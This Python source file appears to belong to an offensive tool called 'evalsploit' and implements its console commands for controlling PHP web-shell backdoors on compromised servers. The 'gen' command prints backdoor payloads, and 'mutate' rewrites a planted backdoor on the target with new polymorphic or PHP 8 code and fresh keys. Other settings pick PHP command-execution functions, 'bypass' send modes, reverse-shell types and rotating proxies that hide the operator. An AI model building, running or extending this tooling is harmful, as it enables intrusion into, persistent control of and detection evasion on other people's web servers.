"""set, gen, mutate, sessions, save, connect."""

from __future__ import annotations

import random
from typing import TYPE_CHECKING, Optional

from evalsploit.modules.registry import register
from evalsploit.modules.base import Module, confirm_dangerous, get_styles
from evalsploit.transport.payloads import (
    generate_backdoor,
    generate_polymorphic_backdoor,
    generate_php8_backdoor,
    mutation_php,
)
from evalsploit.transport.send import validate_proxy

if TYPE_CHECKING:
    from evalsploit.context import SessionContext


HELP_OPTS = ("h", "-h", "help", "?", "/?")


@register("set")
class SetModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        if not args.strip():
            print("set <module> <value>  or  set <module> help")
            return None
        parts = args.split(maxsplit=1)
        cmd = parts[0].lower()
        setting = parts[1].lower().strip() if len(parts) > 1 else ""
        c = ctx.config
        if cmd == "run":
            if setting in HELP_OPTS:
                print("run: exec, shell_exec, system, passthru, popen, proc_open, expect_popen, pcntl_exec, do")
                print("Current:", c.run_shell)
            elif setting in ("exec", "shell_exec", "system", "passthru", "popen", "proc_open", "expect_popen", "pcntl_exec", "do"):
                c.run_shell = setting
                c.save_global()
                print("Set run:", setting)
            else:
                print("Unknown. set run help")
        elif cmd == "ls":
            ls_styles = get_styles("ls")
            if setting in HELP_OPTS:
                print("ls:", ", ".join(ls_styles) + ". Current:", c.ls_style)
            elif setting in ls_styles:
                c.ls_style = setting
                c.save_global()
                print("Set ls:", setting)
            else:
                print("Unknown. set ls help")
        elif cmd == "cat":
            cat_styles = get_styles("cat")
            if setting in HELP_OPTS:
                print("cat:", ", ".join(cat_styles) + ". Current:", c.cat_style)
            elif setting in cat_styles:
                c.cat_style = setting
                c.save_global()
                print("Set cat:", setting)
            else:
                print("Unknown. set cat help")
        elif cmd == "silent":
            if setting in HELP_OPTS:
                print("silent: 0, 1. Current:", c.silent)
            elif setting in ("0", "1"):
                c.silent = setting == "1"
                c.save_global()
                print("Silent:", c.silent)
            else:
                print("Unknown. set silent help")
        elif cmd == "reverse":
            if setting in HELP_OPTS:
                print("reverse: ivan, monkey. Current:", c.reverse_type)
            elif setting in ("ivan", "monkey"):
                c.reverse_type = setting
                c.save_global()
                print("Set reverse:", setting)
            else:
                print("Unknown. set reverse help")
        elif cmd == "send":
            if setting in HELP_OPTS:
                print("send: bypass, classic, simple. Current:", c.send_mode)
            elif setting in ("bypass", "classic", "simple"):
                c.send_mode = setting
                c.save_global()
                print("Set send:", setting)
            else:
                print("Unknown. set send help")
        elif cmd == "confirm":
            if setting in HELP_OPTS:
                print("confirm: 0, 1. Prompt for rm/del/upload/mutate/edit. Current:", c.confirm)
            elif setting in ("0", "1"):
                c.confirm = setting == "1"
                c.save_global()
                print("Set confirm:", c.confirm)
            else:
                print("Unknown. set confirm help")
        elif cmd == "proxy":
            if setting in HELP_OPTS:
                mode_str = "random" if c.proxy_use_index is None else f"#{c.proxy_use_index + 1}"
                print("proxy: 0|1|show|switch|switch N|switch random")
                print("  0 - off, 1 - on. show - list validated and choose. switch - another random. switch N - proxy #N.")
                print("Current: on" if c.proxy_enabled else "Current: off", f", mode: {mode_str}")
            elif setting == "0":
                c.proxy_enabled = False
                c.clear_proxy_session_cache()
                c.save_global()
                print("Proxies disabled.")
            elif setting == "1":
                c.proxy_enabled = True
                c.save_global()
                print("Proxies enabled.")
            elif setting == "show":
                if not c.proxy_list:
                    print("Proxy list empty. Load in startup menu «Proxies».")
                else:
                    indices = c.proxy_validated if c.proxy_validated else list(range(len(c.proxy_list)))
                    for i, idx in enumerate(indices, 1):
                        print(f"  {i}. {c.proxy_list[idx]}")
                    try:
                        num_in = input("Proxy number (1–{} or Enter - cancel): ".format(len(indices))).strip()
                    except EOFError:
                        num_in = ""
                    if not num_in:
                        print("Cancelled.")
                    else:
                        try:
                            n = int(num_in)
                            if 1 <= n <= len(indices):
                                c.proxy_use_index = indices[n - 1]
                                c.proxy_enabled = True
                                c.clear_proxy_session_cache()
                                c.save_global()
                                print(f"Using proxy #{n}: {c.proxy_list[c.proxy_use_index]}")
                            else:
                                print("Invalid number.")
                        except ValueError:
                            print("Enter a number.")
            elif setting == "switch":
                if not c.proxy_list:
                    print("Proxy list empty.")
                else:
                    current = (
                        c.proxy_list[c.proxy_use_index]
                        if c.proxy_use_index is not None
                        else c._proxy_session
                    )
                    pool = (
                        [c.proxy_list[i] for i in c.proxy_validated]
                        if c.proxy_validated
                        else list(c.proxy_list)
                    )
                    pool = [p for p in pool if p != current]
                    test_url = c.url if c.url else None
                    chosen = None
                    while pool:
                        candidate = random.choice(pool)
                        if validate_proxy(candidate, test_url=test_url, timeout=10):
                            chosen = candidate
                            break
                        pool.remove(candidate)
                    if chosen is None:
                        print("No working proxy in list.")
                    else:
                        c._proxy_session = chosen
                        c.proxy_use_index = None
                        c.proxy_enabled = True
                        c.save_global()
                        print(f"Chosen proxy: {chosen}")
            elif setting.startswith("switch "):
                rest = setting[7:].strip()
                if not c.proxy_list:
                    print("Proxy list empty.")
                elif rest == "random":
                    pool = (
                        [c.proxy_list[i] for i in c.proxy_validated]
                        if c.proxy_validated
                        else list(c.proxy_list)
                    )
                    test_url = c.url if c.url else None
                    chosen = None
                    while pool:
                        candidate = random.choice(pool)
                        if validate_proxy(candidate, test_url=test_url, timeout=10):
                            chosen = candidate
                            break
                        pool.remove(candidate)
                    if chosen is None:
                        print("No working proxy in list.")
                    else:
                        c._proxy_session = chosen
                        c.proxy_use_index = None
                        c.proxy_enabled = True
                        c.save_global()
                        print(f"Chosen proxy: {chosen}")
                elif rest.isdigit():
                    n = int(rest)
                    if 1 <= n <= len(c.proxy_list):
                        proxy_str = c.proxy_list[n - 1]
                        test_url = c.url if c.url else None
                        if not validate_proxy(proxy_str, test_url=test_url, timeout=10):
                            print("Proxy bad (validation failed).")
                        c.proxy_use_index = n - 1
                        c.proxy_enabled = True
                        c.clear_proxy_session_cache()
                        c.save_global()
                        print(f"Using proxy #{n}: {proxy_str}")
                    else:
                        print(f"Number must be from 1 to {len(c.proxy_list)}.")
                else:
                    print("set proxy switch N  or  set proxy switch random")
            else:
                print("Unknown. set proxy help")
        elif cmd in (
            "rm", "del", "dl", "download", "get", "upload", "put", "upl",
            "rename", "ren", "mv", "stat", "touch",
            "create", "mkf", "mkdir", "mkd", "md", "cp",
        ):
            if cmd in ("create", "mkf"):
                _cat = "mf"
            elif cmd in ("mkdir", "mkd", "md"):
                _cat = "md"
            elif cmd == "cp":
                _cat = "copy"
            elif cmd in ("download", "get", "dl"):
                _cat = "dl"
            elif cmd in ("upload", "put", "upl"):
                _cat = "upload"
            elif cmd in ("ren", "mv", "rename"):
                _cat = "rename"
            elif cmd == "del":
                _cat = "rm"
            else:
                _cat = cmd
            _attr = f"snippet_{_cat}"
            styles = get_styles(_cat)
            if setting in HELP_OPTS:
                print(f"{cmd}:", ", ".join(styles) + ". Current:", getattr(c, _attr))
            elif setting in styles:
                setattr(c, _attr, setting)
                c.save_global()
                print(f"Set {cmd}:", setting)
            else:
                print(f"Unknown. set {cmd} help")
        else:
            print("Unknown module. set run|ls|cat|silent|reverse|send|confirm|proxy|rm|del|download|upload|rename|stat|touch|mkdir|create|cp <value|help>")
        return None


@register("gen")
class GenModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        payloads = generate_backdoor(ctx.config.send_mode, ctx.config.Z, ctx.config.V)
        for p in payloads:
            print(p)
            print()
        return None


register("generate")(GenModule)


def _get_php_version(ctx: "SessionContext") -> Optional[str]:
    """Send echo phpversion(); and return version string or None."""
    try:
        out = ctx.send("echo phpversion();")
        return out.strip().split("\n")[0].strip() if out else None
    except Exception:
        return None


def _php_major_at_least(version_str: Optional[str], major: int) -> bool:
    """True if version is at least major (e.g. 8.0.13 >= 8)."""
    if not version_str:
        return False
    parts = version_str.strip().split(".")
    if not parts or not parts[0].isdigit():
        return False
    return int(parts[0]) >= major


@register("mutate")
class MutateModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        if not confirm_dangerous(ctx, "mutate", "rewrite backdoor on server"):
            return None
        Zt = __import__("secrets").token_urlsafe(4)
        Vt = __import__("secrets").token_urlsafe(4)
        version = _get_php_version(ctx)
        if _php_major_at_least(version, 8):
            new_backdoor = generate_php8_backdoor(Zt, Vt)
            print(f"PHP {version or '?'} - using PHP 8 mutator (eval, no create_function).")
        else:
            new_backdoor = generate_polymorphic_backdoor(Zt, Vt)
            print(f"PHP {version or '?'} - using polymorphic mutator (create_function).")
        print("New payload (use after mutate):\n", new_backdoor, "\n")
        php = mutation_php(new_backdoor, ctx.config.Z)
        out = ctx.send(php)
        print(out)
        ctx.config.Z = Zt
        ctx.config.V = Vt
        ctx.config.save_global()
        print("Config updated to new Z, V. Use gen to see payload for other files.")
        return None


@register("sessions")
class SessionsModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        names = ctx.config.list_sessions()
        if not names:
            print("No saved sessions")
            return None
        for i, n in enumerate(names, 1):
            print(f"  {i}. {n}")
        return None


@register("saved")
class SavedModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        return SessionsModule().run(ctx, args)


@register("save")
class SaveModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        if not args.strip():
            print("Usage: save <session_name>")
            return None
        name = args.strip().split()[0]
        ctx.config.save_session(name)
        print(f"Saved as session: {name}")
        return None


@register("connect")
class ConnectModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        if not args.strip():
            print("Usage: connect <session_name>")
            return None
        name = args.strip().split()[0]
        if not ctx.config.load_session(name):
            print("Session not found:", name)
            return None
        ctx.config.save_global()
        print(f"Connected to session: {name}")
        return None
